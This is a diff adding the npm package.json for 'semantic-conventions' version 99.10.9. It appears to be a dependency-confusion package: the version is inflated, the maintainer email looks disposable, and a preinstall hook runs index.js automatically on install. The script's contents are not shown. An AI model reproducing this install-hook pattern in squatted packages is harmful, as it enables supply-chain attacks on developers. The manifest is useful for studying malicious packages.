@@ -1,0 +1,39 @@
+{
+    "name": "semantic-conventions",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "semantic-conventions@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-CuRbJUHMgH7XqcgHhO/n1kIN+hIOaRsYOs0col4uKECVaJkRWtL7jFoDdMHrUYA75odUcohOkDKva9v8SCUV3g==",
+        "shasum": "e2df7872adddf4f2096edf4b3426888736ca63bb",
+        "tarball": "https://registry.npmjs.org/semantic-conventions/-/semantic-conventions-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5072,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPM4cACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmruvRAAoxQNF7ML831LLvK2pW2xTlOT1uzs7905dIVKtwHgInery7QV\r\nBS/gHiCACElQL364AiUzMfGWdUTHP3RO58bsDjjC+ZrDNlfB16MjaUQNllLE\r\nLGYQY2dj0pGHQ2voBJRteEbxmm2k0M8DzMhTgI7+FpJouDnAfeQHwMypND7u\r\nRWmeeykcITPkPyeBI2OMHqhcDyKhXkdYU5q+lzmW7CE500HAxE3PohmlfyFa\r\npOEYB9x2dVKTbgrqZ4uUrYJH0QGo59JwEfc22W3tagvqdcfkBpbBoiWULobG\r\n4aqLgiSTEUoy8jtXvwhZCXhVg24n0z20+aUxqBJ7GUXn+j3nH/6BcSA46C5q\r\nxGNCtQqYhjVcS9XEyrCBbA7C9CNNtws53wPSXqRNHOnJLMTKVVNztSgyVIJW\r\n16vhVToxpoMSsMOIVEfiPkOFZEPbuowkqN14MdmfVAbzZwi2gxLmUEA62b5I\r\nioMeYHXtjiVvX/rYzctjjsTCw7THfezpTplOmWKEGVQcPLBogvftmwJha78R\r\nfga9LxO6KNvnc8lDj3btE1DiXATrktwDPSXb2AtarcvPy8bXeI5opj85NQgZ\r\n0bv8BovhyWMlZ1amL4HD5CQ6w6dLp1MVM5+noiKXNB65bHfbvCZhHk607R6/\r\nLjbzECbg6wgwDpx8/x1UWVCa3jrWCTmjeDI=\r\n=3iV2\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "fs6c5zov",
+        "email": "fs6c5zov@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "fs6c5zov",
+            "email": "fs6c5zov@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/semantic-conventions_99.10.9_1648152092805_0.9960290028682603"
+    },
+    "_hasShrinkwrap": false
+}
